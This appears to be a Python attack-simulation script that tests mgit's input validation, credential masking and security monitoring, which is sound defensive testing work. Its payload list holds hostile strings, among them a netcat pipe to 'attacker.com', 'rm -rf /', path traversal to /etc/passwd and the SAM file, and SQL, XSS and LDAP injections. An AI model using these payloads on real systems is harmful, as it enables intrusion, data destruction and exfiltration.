#!/usr/bin/env python3
"""
Practical Security Attack Simulation for mgit
Tests real-world attack scenarios against the security infrastructure
"""

import sys
import os
from pathlib import Path
import time
import json
import subprocess

# Add mgit to path
sys.path.insert(0, str(Path(__file__).parent))

from mgit.security.credentials import CredentialMasker, is_credential_exposed
from mgit.security.validation import SecurityValidator, validate_input
from mgit.security.monitor import get_security_monitor
from mgit.security.integration import initialize_security, get_security_status


class SecurityAttackSimulator:
    """Simulate real-world security attacks."""
    
    def __init__(self):
        # Initialize security
        initialize_security()
        self.validator = SecurityValidator()
        self.masker = CredentialMasker()
        self.monitor = get_security_monitor()
        self.attack_results = []
    
    def simulate_credential_leakage(self):
        """Simulate credential leakage scenarios."""
        print("\n🔴 ATTACK: Credential Leakage Attempts")
        print("="*50)
        
        # Attack 1: Try to log credentials
        print("\n1. Attempting to log GitHub PAT...")
        github_pat = "ghp_RealTokenThatShouldNeverAppearInLogs123"
        
        # Simulate logging attempt
        log_message = f"Authenticating with token: {github_pat}"
        masked_message = self.masker.mask_string(log_message)
        
        attack_blocked = github_pat not in masked_message
        self.attack_results.append({
            'attack': 'Log credential exposure',
            'blocked': attack_blocked,
            'details': f"Original: {log_message[:50]}... -> Masked: {masked_message}"
        })
        print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
        print(f"   Masked output: {masked_message}")
        
        # Attack 2: Try to expose credentials in error messages
        print("\n2. Attempting to expose credentials in error messages...")
        try:
            # Simulate an error with credentials
            error_msg = f"Failed to connect to https://user:{github_pat}@api.github.com"
            masked_error = self.masker.mask_string(error_msg)
            
            attack_blocked = github_pat not in masked_error
            self.attack_results.append({
                'attack': 'Error message credential exposure',
                'blocked': attack_blocked,
                'details': f"Credentials masked in error: {attack_blocked}"
            })
            print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
            
        except Exception as e:
            print(f"   Exception: {e}")
        
        # Attack 3: Try to expose Azure DevOps PAT
        print("\n3. Attempting to expose Azure DevOps PAT...")
        azure_pat = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOP"
        
        # Simulate API response with PAT
        api_response = {
            'url': 'https://dev.azure.com/org/_apis/projects',
            'headers': {
                'Authorization': f'Basic {azure_pat}',
                'X-Custom-Token': azure_pat
            },
            'status': 200
        }
        
        masked_response = self.masker.mask_dict(api_response)
        pat_exposed = azure_pat in str(masked_response)
        
        attack_blocked = not pat_exposed
        self.attack_results.append({
            'attack': 'API response credential exposure',
            'blocked': attack_blocked,
            'details': 'PAT in Authorization header and custom header'
        })
        print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
        
        # Log credential exposure attempt
        if is_credential_exposed(log_message):
            self.monitor.log_credential_exposure(
                "attack_simulation",
                "github_pat",
                "log_message"
            )
    
    def simulate_injection_attacks(self):
        """Simulate various injection attacks."""
        print("\n🔴 ATTACK: Injection Attack Attempts")
        print("="*50)
        
        injection_payloads = [
            # Path traversal
            ("Path Traversal", "../../../../etc/passwd", "path"),
            ("Windows Path Traversal", "..\\..\\..\\windows\\system32\\config\\sam", "path"),
            ("URL Path Traversal", "https://github.com/../../../admin", "url"),
            
            # Command injection
            ("Command Injection in Repo", "repo; rm -rf /", "repo_name"),
            ("Command Injection with Pipe", "repo | nc attacker.com 4444", "repo_name"),
            ("Command Injection with Backticks", "repo`whoami`", "repo_name"),
            
            # SQL injection
            ("SQL Injection", "repo' OR '1'='1", "repo_name"),
            ("SQL Injection Union", "repo' UNION SELECT * FROM users--", "repo_name"),
            
            # Script injection
            ("XSS in Repo Name", "<script>alert('XSS')</script>", "repo_name"),
            ("JS Event Handler", "repo<img src=x onerror=alert(1)>", "repo_name"),
            
            # LDAP injection
            ("LDAP Injection", "admin)(&(password=*))", "org_name"),
            
            # URL manipulation
            ("URL Scheme Attack", "javascript:alert(document.cookie)", "url"),
            ("File Protocol", "file:///etc/passwd", "url"),
        ]
        
        for attack_name, payload, input_type in injection_payloads:
            print(f"\n{attack_name}:")
            print(f"   Payload: {payload}")
            
            # Validate input
            is_valid = validate_input(payload, input_type)
            
            # Log validation failure if detected
            if not is_valid:
                self.monitor.log_validation_failure(input_type, payload, f"{attack_name} detected")
            
            attack_blocked = not is_valid
            self.attack_results.append({
                'attack': attack_name,
                'blocked': attack_blocked,
                'payload': payload,
                'input_type': input_type
            })
            
            print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
    
    def simulate_authentication_attacks(self):
        """Simulate authentication-based attacks."""
        print("\n🔴 ATTACK: Authentication Attack Attempts")
        print("="*50)
        
        # Attack 1: Brute force simulation
        print("\n1. Simulating brute force attack...")
        print("   Attempting 20 rapid failed logins...")
        
        for i in range(20):
            self.monitor.log_authentication_attempt(
                "github",
                f"target-org-{i % 3}",  # Rotate between 3 orgs
                False,
                {'reason': 'Invalid credentials', 'attempt': i+1}
            )
            time.sleep(0.05)  # Small delay
        
        # Check if detected
        summary = self.monitor.get_security_summary(hours=1)
        anomaly_detected = summary['metrics']['suspicious_activities'] > 0
        
        self.attack_results.append({
            'attack': 'Brute force attack',
            'blocked': anomaly_detected,
            'details': f"20 failed attempts, anomaly detected: {anomaly_detected}"
        })
        print(f"   Result: {'DETECTED ✓' if anomaly_detected else 'NOT DETECTED ✗'}")
        
        # Attack 2: Credential stuffing
        print("\n2. Simulating credential stuffing...")
        stolen_creds = [
            ("user1", "password123"),
            ("admin", "admin123"),
            ("test", "test123"),
            ("github", "github123"),
            ("azure", "Password1!"),
        ]
        
        for username, password in stolen_creds:
            self.monitor.log_authentication_attempt(
                "github",
                username,
                False,
                {'reason': 'Credential stuffing attempt', 'password_hash': hash(password)}
            )
        
        print(f"   Attempted {len(stolen_creds)} stolen credential pairs")
        
        # Attack 3: Token replay attack simulation
        print("\n3. Simulating token replay attack...")
        fake_token = "ghp_StolenTokenFromPreviousSession123456"
        
        # Check if token validation catches invalid format
        from mgit.security.credentials import validate_github_pat
        token_valid = validate_github_pat(fake_token)
        
        attack_blocked = not token_valid
        self.attack_results.append({
            'attack': 'Token replay attack',
            'blocked': attack_blocked,
            'details': f"Invalid token format detected: {not token_valid}"
        })
        print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
    
    def simulate_dos_attacks(self):
        """Simulate Denial of Service attacks."""
        print("\n🔴 ATTACK: Denial of Service Attempts")
        print("="*50)
        
        # Attack 1: API rate limit exhaustion
        print("\n1. Attempting to exhaust API rate limits...")
        print("   Making 150 rapid API calls...")
        
        for i in range(150):
            self.monitor.log_api_call(
                "GET",
                f"https://api.github.com/repos/org/repo{i}",
                200 if i < 100 else 429,  # Rate limit after 100
                0.1
            )
        
        # Check if rate limiting triggered
        events = self.monitor.get_recent_events(count=200)
        rate_limit_events = [e for e in events if e.event_type == 'rate_limit_exceeded']
        
        attack_mitigated = len(rate_limit_events) > 0
        self.attack_results.append({
            'attack': 'API rate limit exhaustion',
            'blocked': attack_mitigated,
            'details': f"Rate limiting triggered: {len(rate_limit_events)} times"
        })
        print(f"   Result: {'MITIGATED ✓' if attack_mitigated else 'NOT MITIGATED ✗'}")
        
        # Attack 2: Resource exhaustion via large inputs
        print("\n2. Attempting resource exhaustion with large inputs...")
        
        # Generate very large input
        large_payload = "A" * 10000  # 10KB of data
        
        # Test path validation with large input
        is_valid = self.validator.validate_path(large_payload)
        
        attack_blocked = not is_valid
        self.attack_results.append({
            'attack': 'Resource exhaustion - large input',
            'blocked': attack_blocked,
            'details': f"10KB input rejected: {not is_valid}"
        })
        print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
    
    def simulate_sophisticated_attacks(self):
        """Simulate more sophisticated attack patterns."""
        print("\n🔴 ATTACK: Sophisticated Attack Patterns")
        print("="*50)
        
        # Attack 1: Unicode bypass attempt
        print("\n1. Unicode normalization bypass attempt...")
        unicode_payload = "repo/../\u2025/etc/passwd"  # Using Unicode character
        
        is_valid = self.validator.validate_repository_name(unicode_payload)
        attack_blocked = not is_valid
        
        self.attack_results.append({
            'attack': 'Unicode bypass attempt',
            'blocked': attack_blocked,
            'payload': unicode_payload
        })
        print(f"   Payload: {unicode_payload}")
        print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
        
        # Attack 2: Null byte injection
        print("\n2. Null byte injection attempt...")
        null_byte_payload = "repo.git\x00.exe"
        
        is_valid = self.validator.validate_repository_name(null_byte_payload)
        attack_blocked = not is_valid
        
        self.attack_results.append({
            'attack': 'Null byte injection',
            'blocked': attack_blocked,
            'payload': 'repo.git\\x00.exe'
        })
        print(f"   Result: {'BLOCKED ✓' if attack_blocked else 'FAILED ✗'}")
        
        # Attack 3: Timing attack simulation
        print("\n3. Simulating timing attack on authentication...")
        
        # Log suspicious timing patterns
        self.monitor.log_suspicious_activity(
            'timing_attack_pattern',
            {
                'pattern': 'Consistent 500ms delays between auth attempts',
                'source_ip': '192.168.1.100',
                'target': 'github'
            },
            severity='WARNING'
        )
        
        print("   Timing attack pattern logged for analysis")
    
    def generate_attack_report(self):
        """Generate comprehensive attack simulation report."""
        print("\n" + "="*60)
        print("SECURITY ATTACK SIMULATION REPORT")
        print("="*60)
        
        # Count blocked attacks
        blocked_count = sum(1 for result in self.attack_results if result.get('blocked', False))
        total_attacks = len(self.attack_results)
        
        print(f"\nTotal Attacks Simulated: {total_attacks}")
        print(f"Attacks Blocked: {blocked_count}")
        print(f"Attacks Passed: {total_attacks - blocked_count}")
        print(f"Block Rate: {(blocked_count/total_attacks)*100:.1f}%")
        
        # Get security status
        status = get_security_status()
        print(f"\nSecurity Score: {status['security_score']}/100")
        
        # Categorize results
        categories = {}
        for result in self.attack_results:
            category = result['attack'].split()[0]
            if category not in categories:
                categories[category] = {'blocked': 0, 'total': 0}
            categories[category]['total'] += 1
            if result.get('blocked', False):
                categories[category]['blocked'] += 1
        
        print("\nResults by Category:")
        for category, stats in categories.items():
            block_rate = (stats['blocked']/stats['total'])*100
            print(f"  {category}: {stats['blocked']}/{stats['total']} blocked ({block_rate:.0f}%)")
        
        # Failed attacks (security concerns)
        print("\nSecurity Concerns (Attacks that passed):")
        failed_attacks = [r for r in self.attack_results if not r.get('blocked', False)]
        if failed_attacks:
            for attack in failed_attacks:
                print(f"  ⚠️  {attack['attack']}")
        else:
            print("  ✅ All attacks were successfully blocked!")
        
        # Save detailed report
        report_path = Path("security_attack_report.json")
        with open(report_path, 'w') as f:
            json.dump({
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'summary': {
                    'total_attacks': total_attacks,
                    'blocked_attacks': blocked_count,
                    'block_rate': (blocked_count/total_attacks)*100,
                    'security_score': status['security_score']
                },
                'categories': categories,
                'detailed_results': self.attack_results,
                'security_status': status
            }, f, indent=2)
        
        print(f"\nDetailed report saved to: {report_path}")
        
        # Final verdict
        if blocked_count == total_attacks:
            print("\n🛡️  VERDICT: EXCELLENT - All attack attempts were blocked!")
        elif (blocked_count/total_attacks) >= 0.9:
            print("\n🛡️  VERDICT: GOOD - Most attacks blocked, minor improvements needed")
        elif (blocked_count/total_attacks) >= 0.7:
            print("\n⚠️  VERDICT: MODERATE - Several vulnerabilities need attention")
        else:
            print("\n🔴 VERDICT: CRITICAL - Significant security improvements required")
        
        return blocked_count == total_attacks
    
    def run_all_attacks(self):
        """Run all attack simulations."""
        print("🚨 Starting Security Attack Simulation...")
        print("This will simulate various real-world attack scenarios")
        print("="*60)
        
        # Run attack simulations
        self.simulate_credential_leakage()
        self.simulate_injection_attacks()
        self.simulate_authentication_attacks()
        self.simulate_dos_attacks()
        self.simulate_sophisticated_attacks()
        
        # Generate report
        return self.generate_attack_report()


def main():
    """Main entry point."""
    simulator = SecurityAttackSimulator()
    
    try:
        success = simulator.run_all_attacks()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\nAttack simulation interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\nError during attack simulation: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()